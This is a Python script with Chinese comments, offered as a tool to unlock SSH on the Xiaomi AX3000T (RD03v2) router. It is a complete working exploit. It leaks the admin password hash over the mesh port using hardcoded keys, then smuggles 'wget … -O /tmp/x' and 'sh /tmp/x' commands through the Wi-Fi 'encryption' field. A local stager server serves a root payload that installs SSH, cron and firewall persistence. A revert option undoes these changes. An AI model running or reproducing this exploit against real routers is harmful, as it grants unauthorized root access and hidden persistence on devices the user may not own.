#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
小米 AX3000T 高通版 (RD03v2) 原厂固件 SSH 解锁与恢复工具箱
- 100% 采用 Python 原生标准库，无需 pip 安装任何第三方模块
- 单文件自包含漏洞利用与握手，无需 git clone 任何仓库
- 支持功能：
    [1] 开启 SSH 并永久固化 (支持自定义 root 密码、普通路由与中继 AP 双模式)
    [2] 撤销 Root 权限并完全关闭 SSH (清理自启/NVRAM/密码，无痕还原出厂状态)
"""

import sys
import os
import time
import socket
import ssl
import json
import base64
import hashlib
import hmac
import random
import struct
import re
import threading
import http.server
import urllib.request
import urllib.parse
import urllib.error

# 官方固件常量与出厂凭据
FACTORY_ADMIN_HASH = "73a1d6d01003067844cd148b1502a24bb8a305c93dfef55f983da80fa8cdfa24"
MESH_KEY = b"838d364d8ed3bd085e150211ea6b3715"
MESH_PORT = 19553

def get_local_ip(target="192.168.31.1"):
    """探测本机与路由器通信的网卡 IP（纯标准库，跨平台免调用系统命令）"""
    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    try:
        s.connect((target, 80))
        ip = s.getsockname()[0]
    except Exception:
        ip = "192.168.31.100"
    finally:
        s.close()
    return ip

def port_open(host, port, timeout=2.5):
    """检测 TCP 端口是否畅通"""
    try:
        with socket.create_connection((host, port), timeout=timeout):
            return True
    except OSError:
        return False

# ---- HTTP 请求封装 ----
def http_json(url, data=None, timeout=25, retries=3):
    body = urllib.parse.urlencode(data).encode() if data is not None else None
    req = urllib.request.Request(url, data=body)
    req.add_header("User-Agent", "Mozilla/5.0")
    req.add_header("Connection", "close")
    if body is not None:
        req.add_header("Content-Type", "application/x-www-form-urlencoded")
    
    last_err = None
    for _ in range(retries):
        try:
            with urllib.request.urlopen(req, timeout=timeout) as resp:
                return json.loads(resp.read().decode("utf-8", "replace"))
        except Exception as e:
            last_err = e
            time.sleep(2)
    raise RuntimeError(f"请求失败: {url} -> {last_err}")

# ---- 阶段 1：出厂初始化并重启开放 Mesh 端口 ----
def init_factory_cap(host):
    print("\n[+] 步骤 1/4: 检测路由器出厂状态并初始化环境...")
    info = http_json(f"http://{host}/cgi-bin/luci/api/xqsystem/init_info")
    print(f"[*] 设备型号: {info.get('hardware')}  固件版本: {info.get('romversion')}  初始标记: {info.get('inited')}")

    if port_open(host, MESH_PORT):
        print("[!] 检测到 Mesh 端口 19553 已就绪，无需重复初始化。")
        return

    # 构造未初始化状态下的认证 Nonce
    mac = "00:00:00:00:00:00"
    nonce = f"0_{mac}_{int(time.time())}_{random.randint(1000, 9999)}"
    pwd = hashlib.sha256((nonce + FACTORY_ADMIN_HASH).encode()).hexdigest()
    
    res = http_json(f"http://{host}/cgi-bin/luci/api/xqsystem/login", {
        "username": "admin", "password": pwd, "nonce": nonce
    })
    stok = res.get("token")
    if not stok:
        raise RuntimeError(f"出厂登录被拒绝: {res}。请确保路由器已长按 Reset 恢复出厂，且未走完设置向导！")

    ssid = info.get("routername") or "Xiaomi_AX3000T"
    print(f"[*] 提交免配置初始化 (SSID: {ssid})...")
    http_json(f"http://{host}/cgi-bin/luci/;stok={stok}/api/xqsystem/router_init", {
        "wifi24Ssid": ssid, "wifi50Ssid": ssid
    })

    print("[*] 正在通知路由器重启，启动底层 Mesh 监听服务...")
    try:
        http_json(f"http://{host}/cgi-bin/luci/;stok={stok}/api/xqsystem/reboot", {}, timeout=5)
    except Exception:
        pass

    print("[*] 等待路由器重启并上线 (约需 80~100 秒)，请勿断电或拔网线...")
    time.sleep(30)
    for _ in range(35):
        if port_open(host, MESH_PORT):
            print(f"\n[+] 路由器已重启就绪，Mesh 认证端口 {MESH_PORT} 开放成功！")
            return
        print(".", end="", flush=True)
        time.sleep(3)
    raise RuntimeError("等待超时：路由器 19553 端口未能正常打开。")

# ---- 阶段 2：Mesh 漏洞利用与凭据提取 ----
def q_pass(ident: bytes) -> bytes:
    return base64.b64encode(hmac.new(b"q" + MESH_KEY[1:], ident, hashlib.sha256).digest())

def leak_admin_stok(host):
    ctx = ssl.create_default_context()
    ctx.check_hostname = False
    ctx.verify_mode = ssl.CERT_NONE
    
    raw = socket.create_connection((host, MESH_PORT), timeout=15)
    s = ctx.wrap_socket(raw)

    ident = b"win11poc"
    # 发送 Type 4 认证包
    body = bytearray(0x80)
    body[0:len(ident)] = ident
    body[0x20:0x20 + 44] = q_pass(ident)
    hdr = struct.pack("!4sHHII8s", b"XCAB", 0x1001, 4, len(body), 0, b"\x00" * 8)
    s.sendall(hdr + bytes(body))
    time.sleep(1)

    # 发送 Type 5 状态迁移包
    hdr5 = struct.pack("!4sHHII8s", b"XCAB", 0x1001, 5, 0, 0, b"\x00" * 8)
    s.sendall(hdr5)
    time.sleep(1)

    # 捕获路由器配置同步信息，提取密码哈希
    data = b""
    s.settimeout(5)
    start = time.time()
    while time.time() - start < 8:
        try:
            chunk = s.recv(4096)
            if not chunk: break
            data += chunk
            if b"web_passwd256" in data: break
        except Exception:
            break
    s.close()

    m = re.search(rb'"web_passwd256":\s*"([0-9a-fA-F]{64})"', data)
    if not m:
        raise RuntimeError("未能从 Mesh 握手数据中提取到密码哈希凭据。")
    h256 = m.group(1).decode()
    print(f"[+] 成功提取原厂管理凭据: {h256[:16]}...")

    # 换取管理员会话 token
    nonce = f"0_00:00:00:00:00:00_{int(time.time())}_{random.randint(1000, 9999)}"
    pwd = hashlib.sha256((nonce + h256).encode()).hexdigest()
    res = http_json(f"http://{host}/cgi-bin/luci/api/xqsystem/login", {
        "username": "admin", "password": pwd, "nonce": nonce
    })
    stok = res.get("token")
    if not stok:
        raise RuntimeError(f"换取管理 token 失败: {res}")
    return stok

# ---- 远程自愈与固化 Shell 构造 ----
def build_remote_sh(root_password):
    """
    构造在路由器底层执行的 Shell 脚本：
    1. 设置自定义 root 密码
    2. NVRAM/BDATA 软固化
    3. /data 分区持久化脚本与防火墙自启挂载
    4. WiFi 干净自愈（恢复出厂默认的无密码状态，绝不写死 WiFi 密码）
    5. 恢复 Web 出厂向导初始状态
    """
    safe_pwd = root_password.replace("'", "'\\''")
    
    return f"""#!/bin/sh

# 1. 设置 root 密码
(echo '{safe_pwd}'; sleep 1; echo '{safe_pwd}') | passwd root

# 2. 写入 NVRAM 和 BDATA 环境变量
nvram set ssh_en=1
nvram set telnet_en=1
nvram set uart_en=1
nvram set boot_wait=on
nvram commit
bdata set ssh_en=1 2>/dev/null
bdata commit 2>/dev/null

# 3. 创建持久化守护脚本 (/data 分区在重启或升级时不会丢失)
mkdir -p /data/auto_ssh
cat << 'EOF' > /data/auto_ssh/auto_ssh.sh
#!/bin/sh
[ "$(nvram get ssh_en)" = 0 ] && nvram set ssh_en=1 && nvram commit

if [ -z "$(pidof dropbear)" ]; then
    /etc/init.d/dropbear enable
    /etc/init.d/dropbear restart 2>/dev/null
fi

# 中继模式自愈：如果工作模式切换清空了防火墙自启，自动补齐
if ! uci -q get firewall.auto_ssh >/dev/null; then
    uci set firewall.auto_ssh=include
    uci set firewall.auto_ssh.type='script'
    uci set firewall.auto_ssh.path='/data/auto_ssh/auto_ssh.sh'
    uci set firewall.auto_ssh.enabled='1'
    uci commit firewall 2>/dev/null
fi
EOF
chmod +x /data/auto_ssh/auto_ssh.sh

# 4. 挂载到系统防火墙自启模块
uci set firewall.auto_ssh=include
uci set firewall.auto_ssh.type='script'
uci set firewall.auto_ssh.path='/data/auto_ssh/auto_ssh.sh'
uci set firewall.auto_ssh.enabled='1'
uci commit firewall

# 5. 保底计划任务 (每 5 分钟巡视一次服务状态，防止中继模式抹掉防火墙)
(crontab -l 2>/dev/null | grep -v "auto_ssh"; echo "*/5 * * * * /data/auto_ssh/auto_ssh.sh") | crontab - 2>/dev/null

# 6. 立即拉起 Dropbear SSH
/etc/init.d/dropbear enable
/etc/init.d/dropbear restart 2>/dev/null

# 7. WiFi 优雅自愈：完全还原为出厂默认的免密开放模式，绝不残留任何固定 WiFi 密码
for s in $(uci show wireless 2>/dev/null | sed -n 's/^wireless\\.\\([^.]*\\)=wifi-iface$/\\1/p'); do
    e=$(uci -q get wireless.$s.encryption 2>/dev/null)
    case "$e" in *wget*|*tmp/x*|*sh\\ /*)
        uci -q set wireless.$s.encryption='none'
        uci -q del wireless.$s.key 2>/dev/null
        uci commit wireless
        wifi reload 2>/dev/null
        ;;
    esac
done

# 8. 恢复 Web 出厂向导初始状态
uci -q set xiaoqiang.common.INITTED='NO'
uci commit xiaoqiang
"""

# ---- 远程完全撤销与还原 Shell 构造 ----
def build_revert_sh():
    """
    构造完全撤销 Root / SSH 并恢复初始状态的 Shell 脚本：
    1. 彻底停用并关闭 dropbear (SSH) 与 telnet 服务
    2. 抹掉所有 nvram/bdata 的 ssh/telnet/uart 放行标记并写入闪存
    3. 彻底删除 /data/auto_ssh 固化脚本及目录
    4. 从系统防火墙中永久删除 auto_ssh 自动启动挂载
    5. 清理 crontab 中所有 auto_ssh 相关计划任务
    6. 锁定 root 密码 (重置为出厂锁定状态)
    7. 恢复 Web 出厂向导标记
    """
    return """#!/bin/sh

# 1. 立即停止 Dropbear (SSH) 与 Telnet 服务并禁用开机自启
/etc/init.d/dropbear stop 2>/dev/null
/etc/init.d/dropbear disable 2>/dev/null
/etc/init.d/telnet stop 2>/dev/null
/etc/init.d/telnet disable 2>/dev/null
killall -9 dropbear telnetd 2>/dev/null

# 2. 还原 NVRAM 和 BDATA 环境变量为出厂关闭状态
nvram set ssh_en=0
nvram set telnet_en=0
nvram set uart_en=0
nvram set boot_wait=off
nvram commit
bdata set ssh_en=0 2>/dev/null
bdata commit 2>/dev/null

# 3. 彻底删除 /data 下的持久化脚本
rm -rf /data/auto_ssh

# 4. 从防火墙配置中删除开机自启
uci -q delete firewall.auto_ssh
uci commit firewall 2>/dev/null
/etc/init.d/firewall reload 2>/dev/null

# 5. 清理 crontab 定时任务
(crontab -l 2>/dev/null | grep -v "auto_ssh") | crontab - 2>/dev/null

# 6. 锁定 root 用户密码（恢复出厂禁用直接登录状态）
passwd -l root 2>/dev/null

# 7. 确保 Web 界面处于出厂向导状态
uci -q set xiaoqiang.common.INITTED='NO'
uci commit xiaoqiang 2>/dev/null
"""

class StagerServer(http.server.BaseHTTPRequestHandler):
    payload = b""
    triggered = False
    def do_GET(self):
        StagerServer.triggered = True
        self.send_response(200)
        self.send_header("Content-Type", "text/plain")
        self.end_headers()
        self.wfile.write(StagerServer.payload)
    def log_message(self, format, *args):
        pass

def execute_remote_payload(host, local_ip, payload_content):
    """通过漏洞执行指定的远程脚本"""
    port = 8123
    StagerServer.triggered = False
    StagerServer.payload = payload_content.encode("utf-8")
    httpd = http.server.HTTPServer(("0.0.0.0", port), StagerServer)
    t = threading.Thread(target=httpd.serve_forever, daemon=True)
    t.start()
    print(f"\n[+] 本地临时载荷服务已启动在端口 {port}...")

    print("[+] 提取管理凭据并触发漏洞注入...")
    stok = leak_admin_stok(host)
    
    p_fetch = f'\\" wget http://{local_ip}:{port}/s -O /tmp/x #'
    p_exec = '\\" sh /tmp/x #'
    
    http_json(f"http://{host}/cgi-bin/luci/;stok={stok}/api/xqnetwork/set_wifi_without_restart", {
        "wifiIndex": "1", "ssid": "MiWiFi", "pwd": "meshpoc12345", "encryption": p_fetch
    })
    http_json(f"http://{host}/cgi-bin/luci/;stok={stok}/api/xqnetwork/set_wifi_without_restart", {
        "wifiIndex": "2", "ssid": "MiWiFi", "pwd": "meshpoc12345", "encryption": p_exec
    })
    print("[+] 注入指令已写入，发送 Type-7 信号触发底层 root 权限执行...")

    ctx = ssl.create_default_context()
    ctx.check_hostname = False
    ctx.verify_mode = ssl.CERT_NONE
    raw = socket.create_connection((host, MESH_PORT), timeout=15)
    s = ctx.wrap_socket(raw)

    ident = b"win11poc"
    body4 = bytearray(0x80)
    body4[0:len(ident)] = ident
    body4[0x20:0x20 + 44] = q_pass(ident)
    hdr4 = struct.pack("!4sHHII8s", b"XCAB", 0x1001, 4, len(body4), 0, b"\x00" * 8)
    s.sendall(hdr4 + bytes(body4))
    time.sleep(1)

    hdr5 = struct.pack("!4sHHII8s", b"XCAB", 0x1001, 5, 0, 0, b"\x00" * 8)
    s.sendall(hdr5)
    time.sleep(1.5)

    body7 = bytearray(0x110)
    body7[0] = 1
    hdr7 = struct.pack("!4sHHII8s", b"XCAB", 0x1001, 7, len(body7), 0, b"\x00" * 8)
    s.sendall(hdr7 + bytes(body7))
    time.sleep(3)
    s.close()

    print("[*] 正在等待路由器请求并执行操作脚本...")
    for _ in range(15):
        if StagerServer.triggered:
            break
        time.sleep(1)

def do_unlock(host, local_ip):
    """分支 1：开启 SSH 并固化"""
    print("\n【设置 Root 密码】")
    root_pwd = input("请输入您想为路由器设置的 root 密码 [直接回车默认: admin]: ").strip()
    if not root_pwd:
        root_pwd = "admin"
    print(f"[*] 已设置 root 密码为: {root_pwd}")

    print("\n【选择路由器工作模式】")
    print("  [1] 普通路由模式 (当主路由使用)")
    print("  [2] 中继模式 (当有线 AP / 桥接 / 无线中继使用)")
    choice = input("请选择工作模式 [1 或 2，回车默认 1]: ").strip()
    is_relay = (choice == "2")

    # 步骤 1: 初始化出厂环境
    init_factory_cap(host)

    # 步骤 2 & 3: 触发注入并下发固化脚本
    execute_remote_payload(host, local_ip, build_remote_sh(root_pwd))

    # 步骤 4: 验证 SSH 状态
    print("\n[+] 步骤 4/4: 检查 SSH 服务状态...")
    time.sleep(4)
    if port_open(host, 22):
        print("\n" + "=" * 68)
        print("  🎉 恭喜！SSH 已经成功开启并完成永久固化！")
        print(f"  SSH 登录账号: root")
        print(f"  SSH 登录密码: {root_pwd}")
        print(f"  命令行连接:   ssh root@{host}")
        print("=" * 68)
        print("\n[+] 状态已恢复：已自动将路由器 Web 页面复原为【开箱初始向导】状态！")
        print("    现在打开浏览器访问 http://192.168.31.1 ，即可像全新机一样正常设置向导")
        print("    （设置 WiFi 密码、宽带拨号，或直接在向导中选择中继模式）。")
        print("    无论网页如何配置，后台已固化的 Root / SSH 权限均会长驻生效。")
    else:
        print(f"[!] 端口 22 尚未响应，请等待数秒后在终端执行: ssh root@{host}")

    if is_relay:
        print("\n" + "#" * 68)
        print("  【中继模式后续防覆盖建议】")
        print("  1. 请现在打开浏览器登录 http://192.168.31.1 完成初始化向导，")
        print("     并在后台设置中将工作模式切换为【中继模式】(无线中继或有线中继)。")
        print("  2. 切换后，路由器 IP 会变为主路由器分配的新 IP。")
        print("  3. 脚本已自动内置了防护机制，开机自启不会丢失。")
        print("  4. 【可选】如果日后想关闭每 5 分钟的巡视任务，只需 SSH 连上路由器后运行：")
        print("     crontab -l | grep -v 'auto_ssh' | crontab -")
        print("#" * 68)
    else:
        print("\n[*] 提示：如果日后想关闭每 5 分钟的巡视任务，可随时连上 SSH 运行：")
        print("    crontab -l | grep -v 'auto_ssh' | crontab -")

def do_revert(host, local_ip):
    """分支 2：撤销 Root 并彻底关闭 SSH"""
    print("\n" + "=" * 68)
    print("           【撤销 Root 权限与关闭 SSH 服务向导】")
    print("=" * 68)
    print("本操作将对路由器执行以下清理（完全无痕还原出厂状态）：")
    print("  1. 彻底停止 dropbear (SSH) 及 telnetd 进程，关闭 22 端口。")
    print("  2. 将 NVRAM 与 BDATA 中的 ssh_en/telnet_en/uart_en 标志恢复为 0。")
    print("  3. 完全删除 /data/auto_ssh 持久化目录与脚本。")
    print("  4. 从系统防火墙中移除自启脚本挂载，并清理计划任务。")
    print("  5. 锁定 root 用户密码，恢复为原厂禁用直接登录状态。")
    print("  6. 确保 Web 页面处于出厂向导状态。")
    print("=" * 68)

    confirm = input("\n请确认是否要彻底撤销 Root 并关闭 SSH？[输入 YES 确认，按其他键取消]: ").strip()
    if confirm != "YES":
        print("[*] 操作已取消。")
        return

    # 情况 A：如果当前 SSH 端口仍然开着，并且能连上，优先通过 SSH 执行清理最为彻底
    # 情况 B：如果 SSH 端口已经关了或者不知道密码，通过 Mesh 漏洞再次下发清理脚本
    if port_open(host, MESH_PORT):
        print("\n[*] 检测到 Mesh 端口开放，正在通过底层通道下发撤销与清理载荷...")
        execute_remote_payload(host, local_ip, build_revert_sh())
    else:
        # 如果 Mesh 端口没开（比如用户正常配置后），通过出厂初始化短暂唤醒 Mesh 端口完成清理
        print("\n[*] 正在唤醒底层管理通道以执行无痕清理...")
        init_factory_cap(host)
        execute_remote_payload(host, local_ip, build_revert_sh())

    time.sleep(3)
    print("\n[+] 正在验证清理结果...")
    if not port_open(host, 22):
        print("=" * 68)
        print("  ✔ 撤销成功！SSH 端口 (22) 已成功关闭！")
        print("  ✔ 所有 NVRAM 标记、自启脚本、定时任务均已彻底清除。")
        print("  ✔ root 用户已被锁定，路由器已完全恢复为出厂纯净状态！")
        print("=" * 68)
    else:
        print("[!] 提示：端口 22 仍在响应，可能正在关闭中，建议断电重启路由器以完成最终生效。")

def main():
    print("=" * 68)
    print("      小米 AX3000T 高通版 (RD03v2) 原厂固件 SSH 管理工具箱")
    print("         (纯 Python 原生标准库实现 · 免装模块 · 免克隆代码)")
    print("=" * 68)

    host = "192.168.31.1"
    local_ip = get_local_ip(host)
    print(f"[*] 识别到 Win11 网卡 IP: {local_ip}")
    print(f"[*] 目标路由器默认 IP: {host}")

    print("\n请选择您要执行的操作：")
    print("  [1] 开启 SSH 并永久固化 (获取 Root 权限，开机自启)")
    print("  [2] 撤销 Root 权限并彻底关闭 SSH (清理固化与自启，无痕恢复出厂)")
    action = input("\n请输入数字 [1 或 2，回车默认 1]: ").strip()
    if not action:
        action = "1"

    if action == "1":
        do_unlock(host, local_ip)
    elif action == "2":
        do_revert(host, local_ip)
    else:
        print(f"[-] 未知选项: {action}")

    print("\n操作完毕，按任意键或关闭窗口退出。")

if __name__ == "__main__":
    try:
        main()
    except Exception as e:
        print(f"\n[-] 运行出错: {e}")
